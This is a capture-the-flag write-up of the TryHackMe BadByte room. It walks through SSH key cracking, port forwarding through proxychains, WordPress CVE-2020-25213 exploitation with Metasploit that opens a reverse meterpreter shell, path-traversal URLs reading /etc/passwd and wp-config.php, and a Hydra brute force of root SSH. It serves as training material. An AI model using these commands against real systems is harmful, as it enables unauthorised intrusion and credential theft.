- - - 
created : 22-07-2025 

Tags : #easy 
- - - 
# Objective

Deploy The VM. Infiltrate BadByte and help us to take over root.
# Recon

## Rustscan - Nmap

First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy]
└─$ rustscan -a 10.10.152.27 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.152.27:22
Open 10.10.152.27:30024

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

30024/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
```

# Enumeration

## 30024 (FTP)

We access [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) and download the files, we found a username : `errorcauser` and a ssh_key.

## Ssh2John

We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) python script convert private key to hash :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ ssh2john id_rsa > pass.hash 
```

## John The Ripper

Now we crack the hash with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt

Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)   
```

Boom .

# First Access SSH (22)
## Port Forwarding

Some important flags that will be used in this task for [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) are below.

|   |   |
|---|---|
|Flag|Description|
|-i|If you want to access a remote server using a private key.|
|-L|For local port forwarding. Followed by  <br><br>local_port:remote_address:remote_port|
|-R|For remote port forwarding. Followed by  <br><br>port:local_address:local_port|
|-D|For Dynamic port forwarding. Creates a socks proxy on localhost. Followed by  <br><br>local_PORT|
|-N|Do not execute a remote command.  This is useful for just forwarding ports|
To complete this task:

1. Setup **Dynamic Port Forwarding** using SSH.  
    **HINT:** `-i id_rsa -D 1337`  
    
2. Set up proxychains for the **Dynamic Port Forwarding**. Ensure you have commented out `socks4 127.0.0.1 9050` in your proxychains configuration and add `socks5 127.0.0.1 1337` to the end of configuration file (`/etc/proxychains.conf`).  
    The file name may vary depending on the distro you are using.  
    ![](https://imgur.com/eAPXSMq.png)  
    
3. Run a port scan to enumerate internal ports on the server using proxychains. If you use Nmap your command should look like this `proxychains nmap -sT 127.0.0.1` .
4. After finding the port of the webserver, perform **Local Port Forwarding** to that port using SSH with the **-L** flag.  
    **HINT**: `-i id_rsa -L 80:127.0.0.1:(remote port)` (Try using with sudo)


**Why is it important to know that for this section?**

**Our local machine does not have direct access to the internal services of the machine, but the errorcauser user, the user we compromised, does have access to these resources, so we need to use this user to gain access to the internal services.**

To achieve local port forwarding, we need to execute some commands:

The first command is used to give the private key the appropriate permissions (so only us can use it). In simplest terms, it would make SSH login possible :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ chmod 600 id_rsa 
```

The second command is used to set up Dynamic port forwarding. In simple words, it allows us to set a proxy in our local machine at the specified port (1337) which will listen to the incoming traffic.  
We will enter `cupcake` as passphrase :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ ssh -i id_rsa -D 1337 errorcauser@10.10.152.27       

Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 22 Jul 16:43:39 UTC 2025

  System load:  0.08               Processes:             120
  Usage of /:   31.4% of 18.53GB   Users logged in:       0
  Memory usage: 31%                IPv4 address for ens5: 10.10.152.27
  Swap usage:   0%

```

Once we did it, the third step is editing the proxychain file on our local machine (comment out the socks4) :

![Pasted image 20250722185920.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722185920.png)

Telling our local machine that 1337 port is for proxychain.

Basically, we do the same as the second step — declaring the proxychain, but this time to our local machine (in the second step it was the remote SSH).  
This command is like saying “**local machine, port 1337 is saved for proxy connection**”, which is used to get traffic (such as internal resources that we don’t have direct access to).

## Nmap

Now, we are able to scan the internal services of the machine with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md).  
On our local machine, execute the command:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ sudo  proxychains nmap -sT 127.0.0.1
```

We will get the following results:

```bash
Nmap scan report for localhost (127.0.0.1)
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```
# Exploit

## Web Exploitation

We have HTTP and MYSQL service open in the internal network.  
We can access them through port forwarding with SSH — in this case we will access the HTTP :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ ssh -i id_rsa -L 8080:127.0.01:80 errorcauser@10.10.152.27
Enter passphrase for key 'id_rsa': 

... ... ...

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

# -bash-4.4$ 
```

Once you see the SSH terminal, it means we can now use this service on our local machine, as if we were on the server itself. We can access the web application now:

![Pasted image 20250722190943.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722190943.png)

Wordpress [CMS](../../3%20-%20Tags/Hacking%20Concepts/CMS.md) .

![Pasted image 20250722191233.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250722191233.png)

## Nuclei

We can use [Nuclei](../../3%20-%20Tags/Hacking%20Tools/Nuclei.md) to scan the target for vulnerabilities :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ nuclei -u http://127.0.0.1:8080

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.6

                projectdiscovery.io

'[CVE-2020-25213]' [http] [critical] http://127.0.0.1:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php

'[CVE-2020-11738]' [http] [high] http://127.0.0.1:8080/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

'[CVE-2020-11738]' [http] [high] http://127.0.0.1:8080/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php

[metatag-cms] [http] [info] http://127.0.0.1:8080 ["WordPress 5.3.2"]
[wordpress-theme-detect:twentytwentyone] [http] [info] http://127.0.0.1:8080
[addeventlistener-detect] [http] [info] http://127.0.0.1:8080
[apache-detect] [http] [info] http://127.0.0.1:8080 ["Apache/2.4.41 (Ubuntu)"]
[wordpress-login] [http] [info] http://127.0.0.1:8080/wp-login.php
[apache-server-status] [http] [low] http://127.0.0.1:8080/server-status
[wp-license-file] [http] [info] http://127.0.0.1:8080/license.txt
[wordpress-detect:version_by_css] [http] [info] http://127.0.0.1:8080/wp-admin/install.php ["5.3.2"]
[wordpress-readme-file] [http] [info] http://127.0.0.1:8080/readme.html

```

[CVE-2020-11738](../../3%20-%20Tags/CVEs/CVE-2020-11738.md)    Directory Traversal Vulnerability

[CVE-2020-25213](../../3%20-%20Tags/CVEs/CVE-2020-25213.md)    RCE  

## Metasploit 

We use [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) to search and set the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and run it.

You have to set RHOSTS as 127.0.0.1 ,rport as 8080 , LHOST as your tun0 IP and run the exploit. If everything is fine, you will be prompted with the meterpreter session.

```bash
msf6 > search cve-2020-25213                                                                                                                                                            
                                                                                                                                                                                          
Matching Modules                                                                                                                                                                          
================                                                                                                                                                                          
                                                                                                                                                                                          
   #  Name                                    Disclosure Date  Rank    Check  Description                                                                                                 
   -  ----                                    ---------------  ----    -----  -----------                                                                                                 
   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution                                                
                                                                                                                                                                                          
                                                                                                                                                                                          
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce

msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp

msf6 exploit(multi/http/wp_file_manager_rce) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(multi/http/wp_file_manager_rce) > set rport 8080
rport => 8080
msf6 exploit(multi/http/wp_file_manager_rce) > set lhost tun0
lhost => 10.8.162.183
msf6 exploit(multi/http/wp_file_manager_rce) > run
[*] Started reverse TCP handler on 10.8.162.183:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:8080 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/DcRjvs.php
[*] Sending stage (40004 bytes) to 10.10.152.27
[+] Deleted DcRjvs.php
[*] Meterpreter session 1 opened (10.8.162.183:4444 -> 10.10.152.27:45926) at 2025-07-22 19:29:24 +0200

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 3362 created.
Channel 0 created.
whoami
cth
cd home
cd cth
ls
user.txt
cat user.txt
THM{227906201d17d9c45aa93d0122ea1af7}

```

# Privilege Escalation

Now for the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we find the old password :

```bash
cat /var/log/bash.log
Script started on 2021-03-23 21:05:06+0000
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap

Try: sudo apt install <deb name>

cth@badbyte:~$ 'G00dP@$sw0rd2020' 

G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ____________________________
< vim >>>>>>>>>>>>>>>>> nano >
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay " g = pi ^ 2 " 
 ______________
<  g = pi ^ 2  >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay "mooooooooooooooooooo"
 ______________________
< mooooooooooooooooooo >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ exit

Script done on 2021-03-23 21:07:03+0000

```

## Cupp

We can create a custom wordlist with [Cupp](../../3%20-%20Tags/Hacking%20Tools/Cupp.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ cupp -i

  cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Good
> Surname: Password
> Nickname: GoodPassword
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: G00dP@$sw0rd20  
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to good.txt, counting 5188 words.
[+] Now load your pistolero with good.txt and shoot! Good luck!

```

## Hydra

Let's try if this password is reused (slightly modified) for root access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
└─$ hydra -l root -P good.txt 10.10.152.27 ssh -v   

'G00dP@$sw0rd2021'
```

And we get the password, now we return to `cth` shell and `sudo su root'
and we cat the last flag .

